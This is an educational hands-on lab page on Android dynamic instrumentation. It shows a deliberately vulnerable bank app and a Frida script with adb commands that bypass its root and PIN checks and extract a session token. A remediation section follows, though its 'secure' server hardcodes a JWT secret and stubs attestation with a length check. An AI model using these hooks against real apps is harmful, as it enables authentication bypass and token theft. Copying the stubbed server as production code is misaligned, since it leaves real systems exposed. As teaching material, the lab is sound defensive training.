---
title: "06 - Hands-On Lab: Dynamic Instrumentation & Security Remediation"
description: "Step-by-step hands-on lab demonstrating dynamic vulnerability exploitation of a mobile application using Frida, followed by building a production-grade secure fix using Android KeyStore, BiometricPrompt, and server-side attestation."
keywords: ["Frida Lab", "Mobile Security Lab", "Dynamic Instrumentation", "Android KeyStore", "Play Integrity API", "BiometricPrompt", "AppSec"]
---

# 06 - Hands-On Lab: Dynamic Instrumentation & Security Remediation

> [!IMPORTANT]
> **Lab Objectives:**
> 1. Audit a vulnerable Android financial app containing flawed local root checks and client-side authorization logic.
> 2. Develop a custom Frida JavaScript exploit script to bypass local checks and extract session tokens at runtime.
> 3. Engineer a secure replacement using Android KeyStore, `EncryptedSharedPreferences`, Biometric Prompt, and server-side attestation.

---

## 1. Vulnerable Application Target Code

The target application package `com.vulnerable.bankapp` implements client-side security checks across two classes: `SecurityUtils` and `AuthManager`.

```java
// Vulnerable Target: com/vulnerable/bankapp/SecurityUtils.java
package com.vulnerable.bankapp;

import java.io.File;

public class SecurityUtils {
    
    // VULNERABILITY 1: Flawed, client-side root detection check
    public static boolean isDeviceRooted() {
        String[] paths = {
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su"
        };
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return false;
    }
}
```

```java
// Vulnerable Target: com/vulnerable/bankapp/AuthManager.java
package com.vulnerable.bankapp;

import android.content.Context;
import android.content.SharedPreferences;

public class AuthManager {

    // VULNERABILITY 2: Plaintext PIN validation & local secret storage
    public static boolean verifyPinAndAuthorize(Context context, String inputPin) {
        SharedPreferences prefs = context.getSharedPreferences("BankPrefs", Context.MODE_PRIVATE);
        String storedPin = prefs.getString("user_pin", "1234");
        
        if (inputPin != null && inputPin.equals(storedPin)) {
            // Write session token in plaintext
            prefs.edit().putString("session_token", "SUPER_SECRET_SESSION_TOKEN_9988").apply();
            return true;
        }
        return false;
    }
}
```

---

## 2. Exploit Script Development (Frida JavaScript)

We will write a comprehensive Frida script (`exploit_lab.js`) to intercept and override both methods at runtime.

```javascript
// exploit_lab.js
Java.perform(function () {
    console.log("==================================================");
    console.log("[*] Starting Mobile Dynamic Instrumentation Lab...");
    console.log("==================================================");

    // STEP 1: Bypass Root Detection
    try {
        var SecurityUtils = Java.use("com.vulnerable.bankapp.SecurityUtils");
        SecurityUtils.isDeviceRooted.implementation = function () {
            console.log("[+] Intercepted SecurityUtils.isDeviceRooted()");
            console.log("[+] Forcing return value -> false (Root Check Bypassed)");
            return false;
        };
    } catch (err) {
        console.log("[!] Failed to hook SecurityUtils: " + err.message);
    }

    // STEP 2: Bypass PIN Verification & Intercept Session Tokens
    try {
        var AuthManager = Java.use("com.vulnerable.bankapp.AuthManager");
        AuthManager.verifyPinAndAuthorize.implementation = function (context, inputPin) {
            console.log("[+] Intercepted AuthManager.verifyPinAndAuthorize()");
            console.log("[+] Entered PIN Parameter: " + inputPin);
            console.log("[+] Forcing return value -> true (Authentication Bypassed)");
            
            // Execute original method to allow internal state mutation
            var result = this.verifyPinAndAuthorize(context, "1234");
            
            // Inspect SharedPreferences to extract created session token
            var SharedPreferences = Java.use("android.content.SharedPreferences");
            var prefs = context.getSharedPreferences("BankPrefs", 0);
            var token = prefs.getString("session_token", "NOT_FOUND");
            console.log("[!!!] Extracted Session Token from RAM: " + token);

            return true;
        };
    } catch (err) {
        console.log("[!] Failed to hook AuthManager: " + err.message);
    }
});
```

---

## 3. Step-by-Step Execution Guide

### Prerequisites
*   Android Studio Emulator running Android 11.0+ (x86_64 image without Google Play store for root access, or Genymotion).
*   ADB (Android Debug Bridge) installed and on system PATH.
*   Python 3.x and Frida tools installed on host machine (`pip install frida-tools`).

### Execution Protocol

```bash
# Step 1: Download matching frida-server binary for x86_64 emulator
# https://github.com/frida/frida/releases

# Step 2: Push frida-server to Android emulator via ADB
adb push frida-server-16.x.x-android-x86_64 /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server-16.x.x-android-x86_64"

# Step 3: Start frida-server with root privileges
adb shell "su -c '/data/local/tmp/frida-server-16.x.x-android-x86_64 &'"

# Step 4: Verify frida-server connection from host
frida-ps -U

# Step 5: Execute Frida exploit script against vulnerable target app
frida -U -f com.vulnerable.bankapp -l exploit_lab.js --no-pause
```

### Lab Verification Output
Upon launching the application via Frida, the console displays:

```text
==================================================
[*] Starting Mobile Dynamic Instrumentation Lab...
==================================================
[+] Intercepted SecurityUtils.isDeviceRooted()
[+] Forcing return value -> false (Root Check Bypassed)
[+] Intercepted AuthManager.verifyPinAndAuthorize()
[+] Entered PIN Parameter: 0000
[+] Forcing return value -> true (Authentication Bypassed)
[!!!] Extracted Session Token from RAM: SUPER_SECRET_SESSION_TOKEN_9988
```

---

## 4. Remediation (The Secure Fix)

To secure the application against runtime hooking, plaintext extraction, and rogue devices, we implement hardware key storage, biometric authentication, and server attestation.

### Secure Client Implementation (Kotlin)

```kotlin
// SecureBankAppManager.kt
package com.secure.bankapp

import android.content.Context
import android.content.SharedPreferences
import androidx.biometric.BiometricPrompt
import androidx.core.content.ContextCompat
import androidx.fragment.app.FragmentActivity
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

object SecureBankAppManager {

    // 1. Hardware-backed secure EncryptedSharedPreferences initialization
    private fun getSecurePreferences(context: Context): SharedPreferences {
        val masterKey = MasterKey.Builder(context)
            .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
            .build()

        return EncryptedSharedPreferences.create(
            context,
            "secure_bank_prefs",
            masterKey,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        )
    }

    // 2. Hardware-enforced Biometric Authentication
    fun authenticateAndExecute(
        activity: FragmentActivity,
        onSuccess: () -> Unit,
        onFailure: (String) -> Unit
    ) {
        val executor = ContextCompat.getMainExecutor(activity)
        val biometricPrompt = BiometricPrompt(
            activity, 
            executor,
            object : BiometricPrompt.AuthenticationCallback() {
                override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
                    super.onAuthenticationSucceeded(result)
                    onSuccess()
                }

                override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
                    super.onAuthenticationError(errorCode, errString)
                    onFailure(errString.toString())
                }
            }
        )

        val promptInfo = BiometricPrompt.PromptInfo.Builder()
            .setTitle("Authorize Transaction")
            .setSubtitle("Confirm your identity using biometrics")
            .setNegativeButtonText("Cancel")
            .setAllowedAuthenticators(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)
            .build()

        biometricPrompt.authenticate(promptInfo)
    }

    // 3. Save session token securely
    fun saveEncryptedSessionToken(context: Context, token: String) {
        val prefs = getSecurePreferences(context)
        prefs.edit().putString("secure_session_token", token).apply()
    }
}
```

---

### Secure Server-Side Attestation Validator (Python)

```python
# server_attestation.py
import time
import jwt
from flask import Flask, request, jsonify

app = Flask(__name__)
JWT_SECRET = "SERVER_HIGH_ENTROPY_SECRET_KEY_990011"

@app.route('/api/v1/auth/exchange-token', methods=['POST'])
def exchange_token():
    """
    Validates mobile attestation payload before issuing backend session JWT.
    """
    data = request.get_json()
    play_integrity_token = data.get("integrity_token")
    user_id = data.get("user_id")

    if not play_integrity_token or not user_id:
        return jsonify({"error": "Missing required parameters"}), 400

    # Validate Play Integrity Token (In production, invoke Google API)
    # Simulated check:
    is_valid_device = verify_token_with_google(play_integrity_token)
    if not is_valid_device:
        return jsonify({"error": "Device integrity check failed. Access denied."}), 403

    # Generate Secure Server-Side JWT Token (Expires in 15 mins)
    payload = {
        "sub": user_id,
        "iat": int(time.time()),
        "exp": int(time.time()) + 900,
        "iss": "https://api.securebank.com"
    }
    
    signed_jwt = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
    return jsonify({"session_token": signed_jwt}), 200

def verify_token_with_google(token: str) -> bool:
    # Production: Decode token via Google API and verify MEETS_DEVICE_INTEGRITY
    return len(token) > 20

if __name__ == '__main__':
    app.run(port=5000)
```
